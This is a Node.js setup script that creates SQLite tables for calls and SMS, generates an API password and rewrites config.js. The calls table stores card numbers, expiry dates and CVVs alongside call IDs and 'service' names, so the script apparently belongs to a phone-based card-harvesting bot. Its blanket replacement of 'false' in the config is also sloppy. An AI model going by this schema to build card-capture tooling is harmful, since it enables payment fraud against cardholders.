/**
 * Initial setup script for the API application.
 * - Creates required SQLite tables if they do not exist.
 * - Generates a secure API password and updates config.js.
 * - Marks setup as done in config.js.
 */
module.exports = function(request, response) {
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');
    const fs = require('fs');
    const generator = require('generate-password');

    // Create necessary tables for calls and SMS if they don't exist
    db.serialize(function() {
        db.run(`CREATE TABLE IF NOT EXISTS calls (
            itsfrom TEXT,
            itsto TEXT,
            callSid TEXT,
            status TEXT,
            date TEXT,
            user TEXT,
            name TEXT,
            service TEXT,
            card_number TEXT,
            card_expiry TEXT,
            card_cvv TEXT,
            card_stage TEXT
        )`);
        db.run(`CREATE TABLE IF NOT EXISTS sms (
            itsfrom TEXT,
            itsto TEXT,
            smssid TEXT,
            content TEXT,
            status TEXT,
            date TEXT,
            user TEXT,
            service TEXT
        )`);
    });

    // Read config.js, generate a new API password, and update the config file
    fs.readFile('config.js', 'utf-8', function(err, data) {
        if (err) throw err;

        // Generate a strong random password
        var pass = generator.generate({ length: 32, numbers: true });

        // Replace placeholder password in config.js
        var newapipassword = data.replace(/passwordtochange/gim, pass);

        fs.writeFile('config.js', newapipassword, 'utf-8', function(err) {
            if (err) throw err;
            console.log('Setup the new API password: done.');

            // Mark setup as done in config.js
            fs.readFile('config.js', 'utf-8', function(err, data) {
                if (err) throw err;
                var setupdone = data.replace(/false/gim, 'true');
                fs.writeFile('config.js', setupdone, 'utf-8', function(err) {
                    if (err) throw err;
                    console.log('Automatic setup: done.');
                });
            });
        });
    });
};